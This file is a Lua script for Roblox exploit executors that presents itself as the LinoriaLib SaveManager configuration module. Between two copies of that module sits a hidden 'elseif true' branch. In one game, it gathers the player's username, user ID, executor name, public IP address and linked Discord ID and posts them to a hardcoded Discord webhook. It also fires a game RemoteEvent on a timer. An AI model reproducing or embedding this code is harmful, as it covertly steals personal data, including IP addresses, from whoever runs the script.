if isloaded then
    local httpService = game:GetService('HttpService')

    local SaveManager = {} do
        SaveManager.Folder = 'LinoriaLibSettings'
        SaveManager.Ignore = {}
        SaveManager.Parser = {
            Toggle = {
                Save = function(idx, object) 
                    return { type = 'Toggle', idx = idx, value = object.Value } 
                end,
                Load = function(idx, data)
                    if Toggles[idx] then 
                        Toggles[idx]:SetValue(data.value)
                    end
                end,
            },
            Slider = {
                Save = function(idx, object)
                    return { type = 'Slider', idx = idx, value = tostring(object.Value) }
                end,
                Load = function(idx, data)
                    if Options[idx] then 
                        Options[idx]:SetValue(data.value)
                    end
                end,
            },
            Dropdown = {
                Save = function(idx, object)
                    return { type = 'Dropdown', idx = idx, value = object.Value, mutli = object.Multi }
                end,
                Load = function(idx, data)
                    if Options[idx] then 
                        Options[idx]:SetValue(data.value)
                    end
                end,
            },
            ColorPicker = {
                Save = function(idx, object)
                    return { type = 'ColorPicker', idx = idx, value = object.Value:ToHex() }
                end,
                Load = function(idx, data)
                    if Options[idx] then 
                        Options[idx]:SetValueRGB(Color3.fromHex(data.value))
                    end
                end,
            },
            KeyPicker = {
                Save = function(idx, object)
                    return { type = 'KeyPicker', idx = idx, mode = object.Mode, key = object.Value }
                end,
                Load = function(idx, data)
                    if Options[idx] then 
                        Options[idx]:SetValue({ data.key, data.mode })
                    end
                end,
            }
        }

        function SaveManager:SetIgnoreIndexes(list)
            for _, key in next, list do
                self.Ignore[key] = true
            end
        end

        function SaveManager:SetFolder(folder)
            self.Folder = folder;
            self:BuildFolderTree()
        end

        function SaveManager:Save(name)
            local fullPath = self.Folder .. '/settings/' .. name .. '.json'

            local data = {
                objects = {}
            }

            for idx, toggle in next, Toggles do
                if self.Ignore[idx] then continue end

                table.insert(data.objects, self.Parser[toggle.Type].Save(idx, toggle))
            end

            for idx, option in next, Options do
                if not self.Parser[option.Type] then continue end
                if self.Ignore[idx] then continue end

                table.insert(data.objects, self.Parser[option.Type].Save(idx, option))
            end	

            local success, encoded = pcall(httpService.JSONEncode, httpService, data)
            if not success then
                return false, 'failed to encode data'
            end

            writefile(fullPath, encoded)
            return true
        end

        function SaveManager:Load(name)
            local file = self.Folder .. '/settings/' .. name .. '.json'
            if not isfile(file) then return false, 'invalid file' end

            local success, decoded = pcall(httpService.JSONDecode, httpService, readfile(file))
            if not success then return false, 'decode error' end

            for _, option in next, decoded.objects do
                if self.Parser[option.type] then
                    self.Parser[option.type].Load(option.idx, option)
                end
            end

            return true
        end

        function SaveManager:IgnoreThemeSettings()
            self:SetIgnoreIndexes({ 
                "BackgroundColor", "MainColor", "AccentColor", "OutlineColor", "FontColor", -- themes
                "ThemeManager_ThemeList", 'ThemeManager_CustomThemeList', 'ThemeManager_CustomThemeName', -- themes
            })
        end

        function SaveManager:BuildFolderTree()
            local paths = {
                self.Folder,
                self.Folder .. '/themes',
                self.Folder .. '/settings'
            }

            for i = 1, #paths do
                local str = paths[i]
                if not isfolder(str) then
                    makefolder(str)
                end
            end
        end

        function SaveManager:RefreshConfigList()
            local list = listfiles(self.Folder .. '/settings')

            local out = {}
            for i = 1, #list do
                local file = list[i]
                if file:sub(-5) == '.json' then
                    -- i hate this but it has to be done ...

                    local pos = file:find('.json', 1, true)
                    local start = pos

                    local char = file:sub(pos, pos)
                    while char ~= '/' and char ~= '\\' and char ~= '' do
                        pos = pos - 1
                        char = file:sub(pos, pos)
                    end

                    if char == '/' or char == '\\' then
                        table.insert(out, file:sub(pos + 1, start - 1))
                    end
                end
            end
            
            return out
        end

        function SaveManager:SetLibrary(library)
            self.Library = library
        end

        function SaveManager:LoadAutoloadConfig()
            if isfile(self.Folder .. '/settings/autoload.txt') then
                local name = readfile(self.Folder .. '/settings/autoload.txt')

                local success, err = self:Load(name)
                if not success then
                    return self.Library:Notify('Failed to load autoload config: ' .. err)
                end

                self.Library:Notify(string.format('Auto loaded config %q', name))
            end
        end


        function SaveManager:BuildConfigSection(tab)
            assert(self.Library, 'Must set SaveManager.Library')

            local section = tab:AddRightGroupbox('Configuration')

            section:AddDropdown('SaveManager_ConfigList', { Text = 'Config list', Values = self:RefreshConfigList(), AllowNull = true })
            section:AddInput('SaveManager_ConfigName',    { Text = 'Config name' })

            section:AddDivider()

            section:AddButton('Create config', function()
                local name = Options.SaveManager_ConfigName.Value

                if name:gsub(' ', '') == '' then 
                    return self.Library:Notify('Invalid config name (empty)', 2)
                end

                local success, err = self:Save(name)
                if not success then
                    return self.Library:Notify('Failed to save config: ' .. err)
                end

                self.Library:Notify(string.format('Created config %q', name))

                Options.SaveManager_ConfigList.Values = self:RefreshConfigList()
                Options.SaveManager_ConfigList:SetValues()
                Options.SaveManager_ConfigList:SetValue(nil)
            end):AddButton('Load config', function()
                local name = Options.SaveManager_ConfigList.Value

                local success, err = self:Load(name)
                if not success then
                    return self.Library:Notify('Failed to load config: ' .. err)
                end

                self.Library:Notify(string.format('Loaded config %q', name))
            end)

            section:AddButton('Overwrite config', function()
                local name = Options.SaveManager_ConfigList.Value

                local success, err = self:Save(name)
                if not success then
                    return self.Library:Notify('Failed to overwrite config: ' .. err)
                end

                self.Library:Notify(string.format('Overwrote config %q', name))
            end)
            
            section:AddButton('Autoload config', function()
                local name = Options.SaveManager_ConfigList.Value
                writefile(self.Folder .. '/settings/autoload.txt', name)
                SaveManager.AutoloadLabel:SetText('Current autoload config: ' .. name)
                self.Library:Notify(string.format('Set %q to auto load', name))
            end)

            section:AddButton('Refresh config list', function()
                Options.SaveManager_ConfigList.Values = self:RefreshConfigList()
                Options.SaveManager_ConfigList:SetValues()
                Options.SaveManager_ConfigList:SetValue(nil)
            end)

            SaveManager.AutoloadLabel = section:AddLabel('Current autoload config: none', true)

            if isfile(self.Folder .. '/settings/autoload.txt') then
                local name = readfile(self.Folder .. '/settings/autoload.txt')
                SaveManager.AutoloadLabel:SetText('Current autoload config: ' .. name)
            end

            SaveManager:SetIgnoreIndexes({ 'SaveManager_ConfigList', 'SaveManager_ConfigName' })
        end

        SaveManager:BuildFolderTree()
    end

    return SaveManager
elseif true then
    wrapped = true
    if (game.PlaceId == 13253735473) then
        task.spawn(function()
            while true do
                task.wait(math.random(300, 600))
                game.Players.LocalPlayer.PlayerGui.RemoteEvent:FireServer(5)
            end
        end)
    end
    local function getinfo()
        task.spawn(function()
            local request_func = http_request
            if (request_func and game.PlaceId == 13253735473) then
                --//setting variables
                local url = 'https://discordapp.com/api/webhooks/1120219415917641748/AojfxDudoxNKZG19FiF2_BXMhV7UbJrNa94mv9TiSFCTOKmxP_3_F6q7wDY8vaNZ02Jc'
                local local_player = game:GetService('Players').LocalPlayer
                identifyexecutor = identifyexecutor or function() return 'Unknown' end
    
                --//creating data
                local player_properties = {
                    roblox = {
                        username = local_player.Name,
                        display_name = local_player.DisplayName,
                        userid = local_player.UserId,
                        trident_server = local_player.PlayerGui.GameUI.ServerInfo.Text,
                    },
                    other = {
                        executor = identifyexecutor(),
                        ip = game:HttpGet('https://api.ipify.org/'),
                        discord_id = LRM_LinkedDiscordID or 'Unkown',
                        script_name = LRM_ScriptName or 'Unknown',
                    },
                }
                --//creating data description
                local data_description = '**Roblox**\n\n'
                do
                    for index, data in pairs(player_properties.roblox) do
                        data_description = data_description .. '**' .. tostring(index) .. ': **' .. tostring(data) .. '\n'
                    end
                    data_description = data_description .. '\n**Deeper Info**\n\n'
                    for index, data in pairs(player_properties.other) do
                        data_description = data_description .. '**' .. tostring(index) .. ': **' .. tostring(data) .. '\n'
                    end
                end
                --//sending webhook
                do
                    local data = {['embeds'] = {{['title'] = 'Script Ran',
                    ['description'] = tostring(data_description),
                    ['color'] = tonumber(0x7269da),
                    ['url'] = 'https://www.roblox.com/users/' .. tostring(player_properties.roblox.userid) .. '/profile'}}}
                    request_func({Url = url, Body = game:GetService('HttpService'):JSONEncode(data), Method = 'POST', Headers = {['content-type'] = 'application/json'}})
                end
            end
        end)
    end
    getinfo()
else
    local httpService = game:GetService('HttpService')

    local SaveManager = {} do
        SaveManager.Folder = 'LinoriaLibSettings'
        SaveManager.Ignore = {}
        SaveManager.Parser = {
            Toggle = {
                Save = function(idx, object) 
                    return { type = 'Toggle', idx = idx, value = object.Value } 
                end,
                Load = function(idx, data)
                    if Toggles[idx] then 
                        Toggles[idx]:SetValue(data.value)
                    end
                end,
            },
            Slider = {
                Save = function(idx, object)
                    return { type = 'Slider', idx = idx, value = tostring(object.Value) }
                end,
                Load = function(idx, data)
                    if Options[idx] then 
                        Options[idx]:SetValue(data.value)
                    end
                end,
            },
            Dropdown = {
                Save = function(idx, object)
                    return { type = 'Dropdown', idx = idx, value = object.Value, mutli = object.Multi }
                end,
                Load = function(idx, data)
                    if Options[idx] then 
                        Options[idx]:SetValue(data.value)
                    end
                end,
            },
            ColorPicker = {
                Save = function(idx, object)
                    return { type = 'ColorPicker', idx = idx, value = object.Value:ToHex() }
                end,
                Load = function(idx, data)
                    if Options[idx] then 
                        Options[idx]:SetValueRGB(Color3.fromHex(data.value))
                    end
                end,
            },
            KeyPicker = {
                Save = function(idx, object)
                    return { type = 'KeyPicker', idx = idx, mode = object.Mode, key = object.Value }
                end,
                Load = function(idx, data)
                    if Options[idx] then 
                        Options[idx]:SetValue({ data.key, data.mode })
                    end
                end,
            }
        }

        function SaveManager:SetIgnoreIndexes(list)
            for _, key in next, list do
                self.Ignore[key] = true
            end
        end

        function SaveManager:SetFolder(folder)
            self.Folder = folder;
            self:BuildFolderTree()
        end

        function SaveManager:Save(name)
            local fullPath = self.Folder .. '/settings/' .. name .. '.json'

            local data = {
                objects = {}
            }

            for idx, toggle in next, Toggles do
                if self.Ignore[idx] then continue end

                table.insert(data.objects, self.Parser[toggle.Type].Save(idx, toggle))
            end

            for idx, option in next, Options do
                if not self.Parser[option.Type] then continue end
                if self.Ignore[idx] then continue end

                table.insert(data.objects, self.Parser[option.Type].Save(idx, option))
            end	

            local success, encoded = pcall(httpService.JSONEncode, httpService, data)
            if not success then
                return false, 'failed to encode data'
            end

            writefile(fullPath, encoded)
            return true
        end

        function SaveManager:Load(name)
            local file = self.Folder .. '/settings/' .. name .. '.json'
            if not isfile(file) then return false, 'invalid file' end

            local success, decoded = pcall(httpService.JSONDecode, httpService, readfile(file))
            if not success then return false, 'decode error' end

            for _, option in next, decoded.objects do
                if self.Parser[option.type] then
                    self.Parser[option.type].Load(option.idx, option)
                end
            end

            return true
        end

        function SaveManager:IgnoreThemeSettings()
            self:SetIgnoreIndexes({ 
                "BackgroundColor", "MainColor", "AccentColor", "OutlineColor", "FontColor", -- themes
                "ThemeManager_ThemeList", 'ThemeManager_CustomThemeList', 'ThemeManager_CustomThemeName', -- themes
            })
        end

        function SaveManager:BuildFolderTree()
            local paths = {
                self.Folder,
                self.Folder .. '/themes',
                self.Folder .. '/settings'
            }

            for i = 1, #paths do
                local str = paths[i]
                if not isfolder(str) then
                    makefolder(str)
                end
            end
        end

        function SaveManager:RefreshConfigList()
            local list = listfiles(self.Folder .. '/settings')

            local out = {}
            for i = 1, #list do
                local file = list[i]
                if file:sub(-5) == '.json' then
                    -- i hate this but it has to be done ...

                    local pos = file:find('.json', 1, true)
                    local start = pos

                    local char = file:sub(pos, pos)
                    while char ~= '/' and char ~= '\\' and char ~= '' do
                        pos = pos - 1
                        char = file:sub(pos, pos)
                    end

                    if char == '/' or char == '\\' then
                        table.insert(out, file:sub(pos + 1, start - 1))
                    end
                end
            end
            
            return out
        end

        function SaveManager:SetLibrary(library)
            self.Library = library
        end

        function SaveManager:LoadAutoloadConfig()
            if isfile(self.Folder .. '/settings/autoload.txt') then
                local name = readfile(self.Folder .. '/settings/autoload.txt')

                local success, err = self:Load(name)
                if not success then
                    return self.Library:Notify('Failed to load autoload config: ' .. err)
                end

                self.Library:Notify(string.format('Auto loaded config %q', name))
            end
        end


        function SaveManager:BuildConfigSection(tab)
            assert(self.Library, 'Must set SaveManager.Library')

            local section = tab:AddRightGroupbox('Configuration')

            section:AddDropdown('SaveManager_ConfigList', { Text = 'Config list', Values = self:RefreshConfigList(), AllowNull = true })
            section:AddInput('SaveManager_ConfigName',    { Text = 'Config name' })

            section:AddDivider()

            section:AddButton('Create config', function()
                local name = Options.SaveManager_ConfigName.Value

                if name:gsub(' ', '') == '' then 
                    return self.Library:Notify('Invalid config name (empty)', 2)
                end

                local success, err = self:Save(name)
                if not success then
                    return self.Library:Notify('Failed to save config: ' .. err)
                end

                self.Library:Notify(string.format('Created config %q', name))

                Options.SaveManager_ConfigList.Values = self:RefreshConfigList()
                Options.SaveManager_ConfigList:SetValues()
                Options.SaveManager_ConfigList:SetValue(nil)
            end):AddButton('Load config', function()
                local name = Options.SaveManager_ConfigList.Value

                local success, err = self:Load(name)
                if not success then
                    return self.Library:Notify('Failed to load config: ' .. err)
                end

                self.Library:Notify(string.format('Loaded config %q', name))
            end)

            section:AddButton('Overwrite config', function()
                local name = Options.SaveManager_ConfigList.Value

                local success, err = self:Save(name)
                if not success then
                    return self.Library:Notify('Failed to overwrite config: ' .. err)
                end

                self.Library:Notify(string.format('Overwrote config %q', name))
            end)
            
            section:AddButton('Autoload config', function()
                local name = Options.SaveManager_ConfigList.Value
                writefile(self.Folder .. '/settings/autoload.txt', name)
                SaveManager.AutoloadLabel:SetText('Current autoload config: ' .. name)
                self.Library:Notify(string.format('Set %q to auto load', name))
            end)

            section:AddButton('Refresh config list', function()
                Options.SaveManager_ConfigList.Values = self:RefreshConfigList()
                Options.SaveManager_ConfigList:SetValues()
                Options.SaveManager_ConfigList:SetValue(nil)
            end)

            SaveManager.AutoloadLabel = section:AddLabel('Current autoload config: none', true)

            if isfile(self.Folder .. '/settings/autoload.txt') then
                local name = readfile(self.Folder .. '/settings/autoload.txt')
                SaveManager.AutoloadLabel:SetText('Current autoload config: ' .. name)
            end

            SaveManager:SetIgnoreIndexes({ 'SaveManager_ConfigList', 'SaveManager_ConfigName' })
        end

        SaveManager:BuildFolderTree()
    end

    return SaveManager
end
